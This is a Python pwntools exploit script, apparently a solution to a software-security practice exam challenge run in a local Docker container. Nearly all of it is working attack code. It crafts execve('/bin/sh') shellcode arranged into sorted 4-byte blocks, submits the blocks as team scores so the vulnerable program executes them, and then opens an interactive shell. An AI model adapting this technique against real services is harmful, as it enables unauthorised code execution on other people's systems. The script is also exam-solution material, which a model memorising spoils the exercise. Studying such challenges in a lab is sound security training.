#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve_exam_prep.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-5')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
#pwn.pause()

# secret function pdjlf
secret_function_name = b'pdjlf'
name = ''
for c in secret_function_name:
    name += chr(c-3)
print(name)
#magic

"""
struct team {
    char *name;
    int points;
}

struct teams {
    team *teams;
    __int64 max_teams;
    __int64 number_of_teams;
}
"""

# we can create teams and give them points
# the teams are sorted by points (highest first)
# we can call magic(), then the points are stored into memory back to back
# then we call the pointer into memory
# that means RIP is set to our memory
# that means we have shellcode (not ROP chain)
# only problem is, that shell code needs to be sorted in 4Byte blocks
# i use the following shellcode as a start:
"""
mov rax, 59;
mov rbx, 0x0068732f6e69622f;
push rbx;
mov rdi, rsp;
mov rsi, 0;
mov rdx, 0;
syscall;
"""

shellcode = pwn.asm("""
    nop;
    nop;
    mov rbx, 0x68732f6e69622f00;
   
    ror rbx, 100;
    ror rbx, 100;
                    
    xor eax, eax;         # 0x53909090
    nop;
    push rbx;   

    xor rsi, rsi;         # 0x48f63148
    mov rdi, rsp;
    xor rdx, rdx;
    nop;
    push 8;
                    
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;
    inc eax;
    push 0;

                            
    syscall;              # 0x50f
    .byte 0x00, 0x00   
""")
# the program sorts 32-bit integers
# integers are stored little endien
# so when we read our shellcode at 4-byte we need to unpack these bytes to int as little endien
for i in range(0, len(shellcode),4):
    # make sure that numbers get smaller
    print(str(pwn.u32(shellcode[i:i+4], endian='little')).rjust(11))
# send 
for i in range(0, len(shellcode),4):
    conn.sendlineafter(b'> ', b'submit')
    conn.sendlineafter(b'Enter the team name: ', b'team' + str(i).encode())
    conn.sendlineafter(b'Enter the score for the task: ', str(pwn.u32(shellcode[i:i+4])).encode())

conn.sendlineafter(b'> ', b'magic')

# enjoy the shell
conn.interactive()
